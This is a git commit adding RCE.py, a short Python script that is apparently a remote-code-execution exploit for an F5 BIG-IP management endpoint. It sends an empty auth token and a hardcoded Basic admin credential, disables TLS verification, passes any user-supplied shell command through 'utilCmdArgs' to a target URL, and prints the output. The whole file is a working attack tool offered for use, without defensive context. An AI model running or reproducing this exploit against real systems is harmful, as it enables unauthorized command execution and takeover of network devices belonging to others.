0f8bdd7cf31f9730a947358c9c9698fcb2663146
tfwcodes <86290437+tfwcodes@users.noreply.github.com>
2021-08-27 15:20:12 +0300

    Add files via upload

---
+++ RCE.py
@@ -0,0 +1,43 @@
+import requests
+import json
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+
+
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
+def check_url(url):
+    try:
+        s2 = requests.session()
+        s2.get(url)
+        print("[INFO] The target url is valid")
+    except:
+        print("[INFO] The target url is invalid")
+        input()
+        exit()
+
+def attack(url, command):
+    headers = {
+            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:76.0) Gecko/20100101 Firefox/76.0',
+            'Content-Type': 'application/json',
+            'X-F5-Auth-Token': '',
+            'Authorization': 'Basic YWRtaW46QVNhc1M='
+    }
+
+    data = json.dumps({'command' : 'run', 'utilCmdArgs' : '-c' + command})
+
+    s = requests.session()
+    r = s.post(url, data=data, headers=headers, verify=False)
+    if r.status_code == 200:
+        print("[ATTACK] The target is vulnerable")
+
+        response_from_target = r.text
+        print("[ATTACK] response from the target: " + "\n" + "{}".format(response_from_target))
+    else:
+        print("[ATTACK] The target is not vulnerable")
+
+
+url_rce = input("[+] Enter the target url: ")
+check_url(url_rce)
+
+command_rce = input("[+] Enter the command to execute: ")
+attack(url_rce, command_rce)
